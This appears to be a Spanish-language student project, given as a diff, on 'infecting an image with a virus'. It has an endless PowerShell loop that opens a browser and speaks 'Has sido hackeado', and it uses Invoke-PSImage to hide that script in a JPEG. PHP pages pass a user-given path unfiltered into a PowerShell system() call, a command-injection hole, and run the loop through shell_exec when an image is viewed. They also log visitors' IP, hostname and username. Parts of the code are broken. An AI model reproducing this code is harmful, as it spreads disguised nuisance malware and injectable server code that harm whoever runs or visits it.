@@ -1,0 +1,130 @@
+## PowerShell | Infectar una imagen con virus
+// Virus SPAM
+  while(2) {
+ Start-Process chrome https://www.jesusninoc.com
+ Start-Sleep -Seconds 
+ (New-Object -com SAPI.SpVoice).speak("Has sido hackeado")
+ }
+ 
+ //Infectar una imagen con virus
+ Import-Module C:\Users\meanagon\Desktop\Invoke-PSImage.ps1
+ Invoke-PSImage -Script  C:\Users\meanagon\Desktop\virus.ps1 -Out  C:\xampp\htdocs\p001\colinasvirus.jpg  -Image   C:\xampp\htdocs\p001\colinas.jpg 
+
+##Tabla BD
+
+CREATE TABLE IF NOT EXISTS `imagenes` ( `codigo` varchar(999) COLLATE utf8_spanish_ci NOT NULL, `imagen` varchar(999) COLLATE utf8_spanish_ci NOT NULL, `ip` varchar(999) COLLATE utf8_spanish_ci NOT NULL, `Equipo` varchar(999) COLLATE utf8_spanish_ci NOT NULL, `Usuario` varchar(999) COLLATE utf8_spanish_ci NOT NULL, `Fecha` varchar(999) COLLATE utf8_spanish_ci NOT NULL  ) 
+ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci AUTO_INCREMENT=2
+
+##form.html
+<form action="method.php" method="get">
+	<h1>Introduzca nombre de la usuario</h1>
+	<br>
+    Usuario: <input type="text" name="sesion" />
+	<br />
+	<br>
+	<h1>Introduce la ruta de la imagen que quieres subir</h1>
+	<br>
+    Ruta: <input type="text" name="nombre" />
+	<br />
+	<br>
+    <input type="submit" name="submit" value="Enviar" />
+</form>
+
+##method.php
+<?php   
+        $date = date('d-m-Y H:i:s');
+	    $sesion = htmlspecialchars($_GET['sesion']);
+		$nombre = htmlspecialchars($_GET['nombre']);
+		$coded = base64_encode($nombre);
+
+		// Comienzo de la sesión
+        session_start();
+        // Guardar datos de sesión
+        $_SESSION["usuario"] = "$sesion";
+		
+		$command1 = "[System.Convert]::ToBase64String((Get-Content ";
+		$command2 = " -Encoding Byte)) > codedimg.txt";
+		$command = $command1 . $nombre . $command2;
+		$codedcomm = (string)base64_encode($command);
+		$decodedcomm = base64_decode($codedcomm);
+		
+		
+		$ps = system("powershell $decodedcomm");
+		$ps2 = system("powershell -encodedcommand ZwBjACAALgAvAGMAbwBkAGUAZABpAG0AZwAuAHQAeAB0AA==");
+		
+		$var = "C:/xampp/htdocs/p001/ini/datos.ini";
+		$base = parse_ini_file($var);		
+		$php = new PDO($base["baseDeDatos"],$base["usuario"],$base["password"]);
+		$var = gethostname();
+		$ip = $_SERVER['REMOTE_ADDR'];
+		
+		$con = $php->prepare("INSERT INTO imagenes VALUES (:tex, :tex2, :tex3, :tex4, :tex5, :tex6 );");
+		$con->bindParam(':tex',$ps2);
+		$con->bindParam(':tex2',$nombre);
+		$con->bindParam(':tex3',$ip);
+		$con->bindParam(':tex4',$var);
+		$con->bindParam(':tex5',$sesion);
+		$con->bindParam(':tex6',$date);
+		$con->execute();
+		?>
+
+	<h1><?php echo "Imagen subida" ?></h1>
+
+	<h2><?php 
+	function getUserIpAddr(){
+    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+        //ip from share internet
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+        //ip proxy
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }else{
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
+    }
+    echo "Sesión iniciada y establecido nombre de usuario: " . $_SESSION["usuario"];
+    echo "<br>";
+    echo 'IP del usuario '.getUserIpAddr();
+	?></h2>
+	<h2><?php 
+	echo $var ;
+	?></h2>
+
+	<?php
+	session_unset();
+	?>
+
+  ##pickimg.html
+  <form action="pick.php" method="get">
+	<h1>Introduce la imagen que quieres ver</h1>
+	<br>
+    Ruta: <input type="text" name="nombre" />
+	<br />
+    <input type="submit" name="submit" value="Enviar" />
+  </form>
+  ```
+  ##pick.php
+  <?php
+		
+	$var = ("C:/xampp/htdocs/p001/ini/datos.ini");
+	$base = parse_ini_file($var);			
+	$php = new PDO($base["baseDeDatos"],$base["usuario"],$base["password"]);
+	$what = htmlspecialchars($_GET['nombre']);
+
+	$con = $php->prepare("SELECT `codigo` FROM `imagenes`;");
+	$con->execute();
+	$con->bindParam(':tex',$what)
+	$registros = $con->fetchAll(PDO::FETCH_NUM);          
+	$resultado = $registros[0][0];
+	shell_exec('Start-Process chrome https://www.jesusninoc.com
+	Start-Sleep -Seconds 
+	(New-Object -com SAPI.SpVoice).speak("Has sido hackeado")
+	');
+		
+?>
+<br>
+<br>
+<center>
+<img alt="La imagen no se puede mostrar" src="data:;base64,<?php echo "$resultado"; ?>" width="900" height="500"/>
+</center>
